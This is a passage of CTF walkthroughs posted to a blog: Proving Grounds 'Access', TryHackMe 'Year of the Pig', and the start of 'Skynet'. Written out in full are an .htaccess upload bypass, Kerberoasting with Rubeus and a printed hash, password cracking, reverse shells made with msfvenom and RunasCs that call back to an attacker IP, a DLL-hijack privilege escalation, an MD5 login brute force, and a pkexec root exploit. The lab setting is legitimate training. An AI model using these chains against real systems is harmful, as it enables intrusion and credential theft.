ttl 1255985/tcp open http syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.09389/tcp open mc-nmf syn-ack ttl 125 .NET Message Framing49666/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49668/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49673/tcp open ncacn_http syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.049674/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49677/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49704/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49798/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPCService Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2024-06-13T10:04:12|_ start_date: N/A| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 22998/tcp): CLEAN (Timeout)| Check 2 (port 31194/tcp): CLEAN (Timeout)| Check 3 (port 39772/udp): CLEAN (Timeout)| Check 4 (port 61172/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked|_clock-skew: 0s| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required```{: .nolineno .file=Nmap_Results.txt}## Web Enumeration â¤µï¸I checked port 80 and got this interactive page which asks for Buying Tickets and upload the image of it.![Image](Pasted%20image%2020240611112604.png)>Since the Upload page is controlled by Apache Server, Therefore that may be the case that the upload restrictions are put on through `.htaccess` file.{: .prompt-info }So to unblock the access I need to upload the `.htaccess` file with allowed extensions like this ðŸ”»```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Access]â””â”€$ echo \"AddType application/x-httpd-php .dork\" > .htaccess echo \"AddType application/x-php .php\" >> .htaccess```{: .nolineno}Like this ðŸ”»![Image](Pasted%20image%2020240611144914.png)After that I upload my reverse shell file in `.php` extension and I got this shell where I checked the SPN for svc_mssql user , I am collecting this because the svc_mssql may contain SPN which can be helpful to find out the **TGS key** that can get me the password for svc_mssql service user account out of it that's whyðŸ”»```powershellPS C:\\xampp\\htdocs\\uploads> Get-netuser svc_mssqlcompany : Accesslogoncount : 1badpasswordtime : 6/13/2024 9:58:04 AMdistinguishedname : CN=MSSQL,CN=Users,DC=access,DC=offsecobjectclass : {top, person, organizationalPerson, user}lastlogontimestamp : 4/8/2022 2:40:02 AMname : MSSQLobjectsid : S-1-5-21-537427935-490066102-1511301751-1104samaccountname : svc_mssqlcodepage : 0samaccounttype : USER_OBJECTaccountexpires : NEVERcountrycode : 0whenchanged : 7/6/2022 5:23:18 PMinstancetype : 4usncreated : 16414objectguid : 05153e48-7b4b-4182-a6fe-22b6ff95c1a9lastlogoff : 12/31/1600 4:00:00 PMobjectcategory : CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsecdscorepropagationdata : 1/1/1601 12:00:00 AMserviceprincipalname : MSSQLSvc/DC.access.offsecgivenname : MSSQLlastlogon : 4/8/2022 2:40:02 AMbadpwdcount : 1cn : MSSQLuseraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORDwhencreated : 4/8/2022 9:39:43 AMprimarygroupid : 513pwdlastset : 5/21/2022 5:33:45 AMmsds-supportedencryptiontypes : 0usnchanged : 73754PS C:\\xampp\\htdocs\\uploads> ```{: .nolineno}```{: .nolineno}serviceprincipalname : MSSQLSvc/DC.access.offsec```{: .nolineno}I got the serviceprinciplename that matter from this I can get the TGS of this service user named as svc_mssql through rubeus.exe Tool.```powershellPS C:\\xampp\\htdocs\\uploads> .\\Rubeus.exe kerberoast /nowrap ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.3.2 [*] Action: Kerberoasting[*] NOTICE: AES hashes will be returned for AES-enabled accounts.[*] Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.[*] Target Domain : access.offsec[*] Searching path 'LDAP://SERVER.access.offsec/DC=access,DC=offsec' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'[*] Total kerberoastable users : 1[*] SamAccountName : svc_mssql[*] DistinguishedName : CN=MSSQL,CN=Users,DC=access,DC=offsec[*] ServicePrincipalName : MSSQLSvc/DC.access.offsec[*] PwdLastSet : 5/21/2022 5:33:45 AM[*] Supported ETypes : RC4_HMAC_DEFAULT[*] Hash : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$54268E9F5758EB55CB560B027930F09D$6D1DDEDAB1559B458C83382E6CAD9B3E7784F93E076B85E3CF01249D8D744FC6370F3BFF0485ED08074CA6BBE01B93ED279FE3FD03C970FC4CF1D61B5824518F46C1D5C24A0B8B85E888B5CCE137E9F57070914B86D0F6FF988D9454E00DAD2BC0E8A5FDDA8A92513A0BC3164C61D8AFF803FA518EA7E7A8E971B1A292A7D21F058C5D1DBDB17C544ABAB389AB92615D2C8CCDE8F9DD8EFA715719E39FB0CA0FD988CAE6653E8FB9D6DDFFABBA18FF958948195CC3890930BDFDCCE410B24BE73809977165A6F4D353E5EE8038E86458BC92C1E3663305726C455DBFEA86DECB7539FE173EA313A70FEEE3E4E15BF8230ACA18EAB6353CA00FCDF606DF6293771388DC531BF33619F73EF2676B50892146FBF47185A14257D20F2B26FBC0FCBC0C890D9E1AD7DD2C12AA3CB54B39DAF7065FA268883EB76079CFD97F71097D7559E5F8A0D897096724418F6267E2A110DDD659171BFCE07CE34E7B8720D8BD2D95FF8B6ADAD4C7D7385CE461937B683A44A4393ECB0591D501DD499EE52516CB4C45C5B8E89145F3C7679780B38400C996B0BE548C160CFDD9A0C6F011C25D698F9B4D4C42885B8FD279151DED5D20E4E662693CB3601FE1385B6C4879F1C660913EC16B33C7613DFEDCF11EDF86E929633B251264C1C5595ED28356E69C6E2F0D4F2B2AA3AD4081B5E85AFD2FBEE55266AB09E98B46381A2B4B15D6B19B3BFE8EA3A96B81141A296C13B1FDBCE8FAC0112F151161ED2E8B2DA1B0D749C9F03A062431C073B55B3C9CB12A94001DF256038333BE03C57CB7DC9FBB4E8ADB2986A1156A93C705C5166351436D2F8507E75B80DA2B042C5527F023026458D752A384CA622EFAB9E842947CE09681FA57628B14C3C860093589CD9D522D69E31A03239659F82A05FA76D58F62E99BFB61359D383FEE63FA3E794A18E725E667E7DAE8605ECE19E25FC0E5616B06F3C9D4F2657F497F465F04F985AFD16573CBBC67921429B559D0DA0D2C1C16D751ABE458FF83922C339D353E0024CC16559BF919FA21C2DB4DEE234AAFDC1E0E6CE1E108F22C7FC607E727B95B241DBC58085089152A8D0CDF4C6E5642935020DE6D4D04311EC27C452C90DF198CDE8DD5B9BC0D06C41A441789E0FF1B8F93F9BAB8B517845750C02ED07C9901DC43B5D766BBE363990724F29DAB26DB9700A0101721E235203AD0366BDE7EA33849B977361E8B3E76584AEEB2E0C582DBC72E36FC5FC5E7D167B02D27A8A4E1AF69A4CE6E579E726A0AFD863B72FD519C142A2893597402CFC263E2CE956998D0BEDFEA8ECB298CD7589DD049202BD6EAF3C53E8B08E9520317C767A36E3319E8F34B98C80AB158C3B7DAE8D821D4D9CF9B6862584CBDA0835D9A1CF9BA6453654B46D0D318F5B9B9D89AAE08175840EC72219A6A329A0CFAA4B203EE7DD731416B0D7C39F247A9633D4259EF5085ABFF3777801B741543B387021B797ECB3F8B2310E919DA343D3998358219D4119FDE4D8208FDF9F73936EA61562C153EFBD5D4FC5AA70325BB7A21CB1C455DB206252804975BCF8B497D79C445491A7AC90D96C0E48B2055E8014653ACFFE6585C6C9579AB78A8F6D7B0PS C:\\xampp\\htdocs\\uploads>```{: .nolineno}I got the TGS key lets decrypt it using John-The-Ripper Tool.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Access]â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt Created directory: /home/kali/.johnUsing default input encoding: UTF-8Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statustrustno1 (?) 1g 0:00:00:01 DONE (2024-06-13 22:48) 0.7092g/s 726.2p/s 726.2c/s 726.2C/s hockey..bethanyUse the \"--show\" option to display all of the cracked passwords reliablySession completed. ```{: .nolineno}I got the password, So lets get inside the shell of svc_mssql user ðŸ”»```powershellC:\\xampp\\htdocs\\uploads>.\\RunasCs.exe svc_mssql trustno1 powershell.exe -r 192.168.45.214:443[*] Warning: The logon for user 'svc_mssql' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.[+] Running in session 0 with process function CreateProcessWithLogonW()[+] Using Station\\Desktop: Service-0x0-4d037$\\Default[+] Async process 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' with pid 2104 created in background.C:\\xampp\\htdocs\\uploads>```{: .nolineno}I checked the privileges and found one different Privilege Disabled SeManageVolumePrivilege so lets look for any exploit to impersonated to Administrator user ðŸ”»![Image](Pasted%20image%2020240614124251.png)Download the executable from here ðŸ”»https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/publicStep 1ï¸âƒ£. Download the Executable and Transfer it to Victim machine.Step 2ï¸âƒ£. As we got to know that we get read/write access of C:\\ Drive from this exploit so Lets embed our custom payload of dll.The name will be tzres.dll that will enable us the dll hijaking attack.```bashmsfvenom -p windows/shell_reverse_tcp lhost=192.168.45.214 lport=443 -f dll > tzres.dll```{: .nolineno}Step 3ï¸âƒ£. Place this `tzres.dll` into C:\\Windows\\System32\\wbem\\tzres.dll location .Step 4ï¸âƒ£. Now Start the Listener on Attacker Machine and To trigger this exploit run systeminfo . And you will get you shell as Administrator or nt\\system authority > One possible way to get a shell from here is to write a custom dll toÂ `C:\\Windows\\System32\\wbem\\tzres.dll`Â & callÂ `systeminfo`Â to trigger it.{: .prompt-info }This exploit basically work as `dll hijacking` so lets replace the dll with our payload.```pwoershellPS C:\\Users\\svc_mssql\\Desktop> curl http://192.168.45.214:8000/SeManageVolumeExploit.exe -o SeManageVolumeExploit.execurl http://192.168.45.214:8000/SeManageVolumeExploit.exe -o SeManageVolumeExploit.exePS C:\\Users\\svc_mssql\\Desktop> dirdir Directory: C:\\Users\\svc_mssql\\DesktopMode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 6/13/2024 11:50 PM 34 local.txt -a---- 6/13/2024 11:57 PM 12288 SeManageVolumeExploit.exe PS C:\\Users\\svc_mssql\\Desktop> .\\SeManageVolumeExploit.exe.\\SeManageVolumeExploit.exeEntries changed: 919DONE PS C:\\Users\\svc_mssql\\Desktop> curl http://192.168.45.214:8000/Printconfig.dll -o Printconfig.dllcurl http://192.168.45.214:8000/Printconfig.dll -o Printconfig.dllPS C:\\Users\\svc_mssql\\Desktop> copy Printconfig.dll C:\\Windows\\System32\\spool\\drivers\\x64\\3\\copy Printconfig.dll C:\\Windows\\System32\\spool\\drivers\\x64\\3\\PS C:\\Users\\svc_mssql\\Desktop> dir C:\\Windows\\System32\\spool\\drivers\\x64\\3\\dir C:\\Windows\\System32\\spool\\drivers\\x64\\3\\ Directory: C:\\Windows\\System32\\spool\\drivers\\x64\\3Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 9/15/2018 2:08 AM en-US -a---- 9/15/2018 12:11 AM 14088 LOCALE.GPD -a---- 9/15/2018 12:11 AM 73 MSXPSINC.GPD -a---- 9/15/2018 12:11 AM 72 MSXPSINC.PPD -a---- 4/8/2022 12:18 AM 869888 MXDWDRV.DLL -a---- 9/15/2018 12:11 AM 25489 P6DISP.GPD -a---- 9/15/2018 12:11 AM 3293 P6FONT.GPD -a---- 9/15/2018 12:11 AM 288256 PCL4RES.DLL -a---- 9/15/2018 12:11 AM 1025536 PCL5ERES.DLL -a---- 9/15/2018 12:11 AM 1025024 PCL5URES.DLL -a---- 9/15/2018 12:11 AM 204288 PCLXL.DLL -a---- 9/15/2018 12:11 AM 10375 PCLXL.GPD -a---- 9/15/2018 12:11 AM 1156 PJL.GPD -a---- 4/8/2022 12:18 AM 23040 PJLMON.DLL -a---- 6/14/2024 12:01 AM 9216 PrintConfig.dll -a---- 4/8/2022 12:18 AM 1152000 PS5UI.DLL -a---- 9/15/2018 12:11 AM 26038 PSCRIPT.HLP -a---- 9/15/2018 12:11 AM 1062732 PSCRIPT.NTF -a---- 4/8/2022 12:18 AM 675840 PSCRIPT5.DLL -a---- 9/15/2018 12:11 AM 1293180 PSCRPTFE.NTF -a---- 9/15/2018 12:11 AM 5561 PS_SCHM.GDL -a---- 9/15/2018 12:11 AM 23812 STDDTYPE.GDL -a---- 9/15/2018 12:11 AM 14362 STDNAMES.GPD -a---- 9/15/2018 12:11 AM 59116 STDSCHEM.GDL -a---- 9/15/2018 12:11 AM 2278 STDSCHMX.GDL -a---- 9/15/2018 12:11 AM 698 TTFSUB.GPD -a---- 4/8/2022 12:18 AM 559616 UNIDRV.DLL -a---- 9/15/2018 12:11 AM 21225 UNIDRV.HLP -a---- 4/8/2022 12:18 AM 1197056 UNIDRVUI.DLL -a---- 4/8/2022 12:18 AM 855040 UNIRES.DLL -a---- 9/15/2018 12:11 AM 53 unishare-pipelineconfig.xml -a---- 9/15/2018 12:11 AM 3360 unishare.gpd PS C:\\Users\\svc_mssql\\Desktop> $type = [Type]::GetTypeFromCLSID(\"{854A20FB-2D44-457D-992F-EF13785D2B51}\")$type = [Type]::GetTypeFromCLSID(\"{854A20FB-2D44-457D-992F-EF13785D2B51}\")PS C:\\Users\\svc_mssql\\Desktop> $object = [Activator]::CreateInstance($type)$object = [Activator]::CreateInstance($type)Exception calling \"CreateInstance\" with \"1\" argument(s): \"Retrieving the COM class factory for component with CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} failed due to the following error: 80080005 Server execution failed (Exception from HRESULT: 0x80080005 (CO_E_SERVER_EXEC_FAILURE)).\"At line:1 char:1+ $object = [Activator]::CreateInstance($type)+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [], MethodInvocationException + FullyQualifiedErrorId : COMException PS C:\\Users\\svc_mssql\\Desktop> ```{: .nolineno}```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Access]â””â”€$ rlwrap nc -lvnp 445 listening on [any] 445 ...connect to [192.168.45.214] from (UNKNOWN) [192.168.235.187] 49886Microsoft Windows [Version 10.0.17763.2746](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32>whoamiwhoamint authority\\systemC:\\Windows\\system32>cd \\Users\\Administratorcd \\Users\\AdministratorC:\\Users\\Administrator>tree /f /atree /f /aFolder PATH listingVolume serial number is 5C30-DCD7C:.+---3D Objects+---Contacts+---Desktop| proof.txt| +---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Administrator>type Desktop/proof.txttype Desktop/proof.txtThe syntax of the command is incorrect.C:\\Users\\Administrator>type Desktop\\proof.txttype Desktop\\proof.txtdb73084f0f48779aaf5cf188afa894a9C:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Year Of The Pig", "url": "/posts/Year-of-the-Pig/", "categories": "TryHackMe", "tags": "Fuzzing, PrivEsc, SUIDs, pkexec, wfuzz, cewl", "date": "2024-04-27 00:00:00 +0530", "snippet": "| Machine Link | [https://tryhackme.com/r/room/yearofthepig](https://tryhackme.com/r/room/yearofthepig) || ------------------ | ---------------------------------------------------------------...", "content": "| Machine Link | [https://tryhackme.com/r/room/yearofthepig](https://tryhackme.com/r/room/yearofthepig) || ------------------ | -------------------------------------------------------------------------------------- || Operating System | Linux || Difficulty | Hard || Machine Created by | [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle) || | |## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Year_of_the_Pig]â””â”€$ sudo nmap -sC -sV --open 10.10.34.97 Host is up (0.23s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: Marcos Blog|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}{: file='Nmap_Results.txt' .nolineno}## Web Enumeration â¤µï¸I checked port 80 and got this page ðŸ”½![Image](Pasted%20image%2020240326094415.png)_Dashboard Page_I got this login page where after entering some default credentials I got this error message as â¬![Image](Pasted%20image%2020240327203006.png)_login.php Page_I think I need to create a wordlists that comprise of these conditions.I created the `wordlist` through cewl tool that takes all the keywords of the site and make a `wordlist` out of it ðŸ”½```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Year_of_the_Pig]â””â”€$ cewl http://10.10.41.180/ > file.txt```{: .nolineno}To make all the password values as lowercase I used this **trim** command ðŸ”½```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Year_of_the_Pig]â””â”€$ cat file.txt | tr '[:upper:]' '[:lower:]' > wordlist.txt```{: .nolineno}For making the wordlist that is followed by two numbers and a special character I used this custom made python script ðŸ”½```pythonimport itertools# List of special charactersspecial_characters = ['!', '@', '#', '$', '%', '^', '&', '*']# Read words from wordlist filewordlist_file = \"/home/kali/Downloads/Tryhackme/Year_of_the_Pig/wordlist.txt\" # Replace \"your_wordlist_file.txt\" with your wordlist file namewith open(wordlist_file, \"r\") as file: words = file.read().splitlines()# Generate all combinationspasswords = []for word in words: for num_combo in itertools.product(range(10), repeat=2): for special_char in special_characters: password = f\"{word}{num_combo[0]}{num_combo[1]}{special_char}\" passwords.append(password)# Write to filewith open(\"modified_wordlist.txt\", \"w\") as file: for password in passwords: file.write(password + \"\\n\")print(\"Wordlist generated successfully!\")```{: .nolineno}{: file: password.py}Lets use it Now : ```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Year_of_the_Pig]â””â”€$ python3 password.py Wordlist generated successfully!```{: .nolineno}Now I have 134400 numbers of passwords . ```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Year_of_the_Pig]â””â”€$ wc modified_wordlist.txt 134400 140000 1293600 modified_wordlist.txt```{: .nolineno}When Login I noticed this MD5 implementation in password field ðŸ”½![Image](Pasted%20image%2020240327203540.png)_Password is MD5 hashed_So for this hashing + bruteforcing with a wordlist I used this Tool wfuzzThat will take -z flag as input of `wordlist file + hashing` algorithm in it and try it with marco as username .```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Year_of_the_Pig]â””â”€$ wfuzz -c -z file,modified_wordlist.txt,md5 -X POST -u http://10.10.6.83/api/login -d '{\"username\":\"marco\",\"password\":\"FUZZ\"}' --hh 63 \\-H \"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\" \\-H \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\" \\-H \"Accept-Language: en-US,en;q=0.5\" \\-H \"Accept-Encoding: gzip, deflate, br\" \\-H \"Connection: close\" \\-H \"Upgrade-Insecure-Requests: 1\" \\-H \"Content-Type: application/x-www-form-urlencoded\" /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer *********************************************************Target: http://10.10.6.83/api/loginTotal requests: 134400==============================================================ID Response Lines Word Chars Payload ==============================================================000025766: 500 0 L 0 W 0 Ch \"201350fc21c42d769152f1186cb465b2\" 000025768: 500 0 L 0 W 0 Ch \"375af69ffa42147b2e1f62908436d4d3\" 000025769: 200 0 L 3 W 99 Ch \"e..............................c\" ```{: .nolineno}Now I got the password `md5` hash lets crack it with this [online hashes site](https://hashes.com/en/decrypt/hash) ToolðŸ”»![Image](Pasted%20image%2020240327194123.png)_password hash_Lets Login Now â­ï¸![Image](Pasted%20image%2020240327194841.png)_Dashboard Page_### SSH Shell ðŸ”½```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Year_of_the_Pig]â””â”€$ ssh marco@10.10.34.97 The authenticity of host '10.10.34.97 (10.10.34.97)' can not be established.ED25519 key fingerprint is SHA256:NA6wxwks9yC9RRUsw12szoz+dTUjJXyA37m9dSsUCa8.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.34.97' (ED25519) to the list of known hosts.marco@10.10.34.97s password: \t\t__ __ __ _ _ ____ _ \t\\ \\ / /__ __ _ _ __ ___ / _| | |_| |__ ___ | _ \\(_) __ _ \t \\ V / _ \\/ _` | '__| / _ \\| |_ | __| '_ \\ / _ \\ | |_) | |/ _` |\t | | __/ (_| | | | (_) | _| | |_| | | | __/ | __/| | (_| |\t |_|\\___|\\__,_|_| \\___/|_| \\__|_| |_|\\___| |_| |_|\\__, |\t |___/ marco@year-of-the-pig:~$ whoamimarcomarco@year-of-the-pig:~$ iduid=1000(marco) gid=1000(marco) groups=1000(marco),1002(web-developers)marco@year-of-the-pig:~$ ```{: .nolineno}Now I checked SUIDs and got pkexec as SUIDs permitted so I uploaded an exploit related to pkexec from [here](https://github.com/Almorabea/pkexec-exploit/tree/main) and ran it .```bashmarco@year-of-the-pig:~$ find / -perm -u=s -type f 2>/dev/null/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic/usr/bin/chsh/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/newuidmap/usr/bin/passwd/usr/bin/sudo/usr/bin/traceroute6.iputils/usr/bin/at/usr/bin/chfn/usr/bin/newgidmap/usr/bin/pkexec/bin/mount/bin/fusermount/bin/ping/bin/su/bin/umountmarco@year-of-the-pig:~$ marco@year-of-the-pig:~$ /usr/bin/pkexec --versionpkexec version 0.105marco@year-of-the-pig:~$```{: .nolineno}Lets upload our payload here â¬```bashmarco@year-of-the-pig:~$ wget http://10.11.75.200/pkexec_CVE-2021-4034.py--2024-03-27 14:44:25-- http://10.11.75.200/pkexec_CVE-2021-4034.pyConnecting to 10.11.75.200:80... connected.HTTP request sent, awaiting response... 200 OKLength: 3067 (3.0K) [text/x-python]Saving to: â€˜pkexec_CVE-2021-4034.pyâ€™pkexec_CVE-2021-4034.py 100%[==================================================>] 3.00K --.-KB/s in 0.002s 2024-03-27 14:44:26 (1.86 MB/s) - â€˜pkexec_CVE-2021-4034.pyâ€™ saved [3067/3067]marco@year-of-the-pig:~$ chmod +x pkexec_CVE-2021-4034.py marco@year-of-the-pig:~$ python3 pkexec_CVE-2021-4034.py Do you want to choose a custom payload? y/n (n use default payload) n[+] Cleaning pervious exploiting attempt (if exist)[+] Creating shared library for exploit code.[+] Finding a libc library to call execve[+] Found a library at [+] Call execve() with chosen payload[+] Enjoy your root shell# whoamiroot# /bin/bash -iroot@year-of-the-pig:/home/marco# cd /rootroot@year-of-the-pig:/root# ls -altotal 36drwx------ 5 root root 4096 Aug 22 2020 .drwxr-xr-x 22 root root 4096 Aug 16 2020 ..lrwxrwxrwx 1 root root 9 Aug 16 2020 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrcdrwx------ 2 root root 4096 Aug 16 2020 .cachedrwx------ 3 root root 4096 Aug 16 2020 .gnupgdrwxr-xr-x 3 root root 4096 Aug 21 2020 .local-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 42 Aug 16 2020 .vimrc-r-------- 1 root root 38 Aug 22 2020 root.txtroot@year-of-the-pig:/root# cat root.txtTHM{FLAG_FLAG_FLAG_FLAG_FLAG_FLAG}root@year-of-the-pig:/root# ```{: .nolineno}I am root now !!" }, { "title": "Skynet", "url": "/posts/SkyNet/", "categories": "TryHackMe", "tags": "Squirrel_Mail, SMB, SUIDs, pkexec, cronjobs, RFI, LFI, Public Exploit, CMS, Cuppa_CMS, PrivEsc", "date": "2024-04-27 00:00:00 +0530", "snippet": "| Machine Link | [https://tryhackme.com/r/room/skynet](https://tryhackme.com/r/room/skynet) || ------------------ | -------------------------------------------------------------------------- ...", "content": "| Machine Link | [https://tryhackme.com/r/room/skynet](https://tryhackme.com/r/room/skynet) || ------------------ | -------------------------------------------------------------------------- || Operating System | Linux || Difficulty | Easy || Machine Created by | [tryhackme](https://tryhackme.com/p/tryhackme) |## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/SkyNet]â””â”€$ sudo nmap -sC -sV -T4 -oN Nmap_Results.txt -Pn -vv 10.10.117.241Nmap scan report for 10.10.117.241Host is up, received user-set (0.19s latency).Scanned at 2024-04-11 13:01:17 IST for 28sNot shown: 994 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKeTyrvAfbRB4onlz23fmgH5DPnSz07voOYaVMKPx5bT62zn7eZzecIVvfp5LBCetcOyiw2Yhocs0oO1/RZSqXlwTVzRNKzznG4WTPtkvD7ws/4tv2cAGy1lzRy9b+361HHIXT8GNteq2mU+boz3kdZiiZHIml4oSGhI+/+IuSMl5clB5/FzKJ+mfmu4MRS8iahHlTciFlCpmQvoQFTA5s2PyzDHM6XjDYH1N3Euhk4xz44Xpo1hUZnu+P975/GadIkhr/Y0N5Sev+Kgso241/v0GQ2lKrYz3RPgmNv93AIQ4t3i3P6qDnta/06bfYDSEEJXaON+A9SCpk2YSrj4A7| 256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0UWS0x1ZsOGo510tgfVbNVhdE5LkzA4SWDW/5UjDumVQ7zIyWdstNAm+lkpZ23Iz3t8joaLcfs8nYCpMGa/xk=| 256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICHVctcvlD2YZ4mLdmUlSwY8Ro0hCDMKGqZ2+DuI0KFQ80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)| http-methods: |_ Supported Methods: HEAD POST OPTIONS110/tcp open pop3 syn-ack ttl 63 Dovecot pop3d139/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)143/tcp open imap syn-ack ttl 63 Dovecot imapd445/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| nbstat: NetBIOS name: SKYNET, NetBIOS user: , NetBIOS MAC: (unknown)| Names:| SKYNET Flags: | SKYNET Flags: | SKYNET Flags: | \\x01\\x02__MSBROWSE__\\x02 Flags: | WORKGROUP Flags: | WORKGROUP Flags: | WORKGROUP Flags: | Statistics:| 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00| 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00|_ 00:00:00:00:00:00:00:00:00:00:00:00:00:00| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required|_clock-skew: mean: 1h40m01s, deviation: 2h53m13s, median: 0s| smb2-time: | date: 2024-04-11T07:31:35|_ start_date: N/A| smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu)| Computer name: skynet| NetBIOS computer name: SKYNET\\x00| Domain name: \\x00| FQDN: skynet|_ System time: 2024-04-11T02:31:35-05:00| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 11607/tcp): CLEAN (Couldn t connect)| Check 2 (port 43193/tcp): CLEAN (Couldn t connect)| Check 3 (port 52220/udp): CLEAN (Failed to receive data)| Check 4 (port 43943/udp): CLEAN (Failed to receive data)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked```{: .nolineno}{: file='Nmap_Results.txt' .nolineno}## SMB Enumeration â¤µï¸I checked the SMB service with no creds through **netexec** Tool â¬```bashnxc smb 10.10.117.241 -u '' -p '' --shares```{: .nolineno}![Image](Pasted%20image%2020240411155744.png)_netexec Tool_Lets access anonymous share with smbclient Tool.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/SkyNet]â””â”€$ smbclient //10.10.117.241/anonymous Password for [WORKGROUP\\kali]:Try \"help\" to get a list of possible commands.smb: \\> ls . D 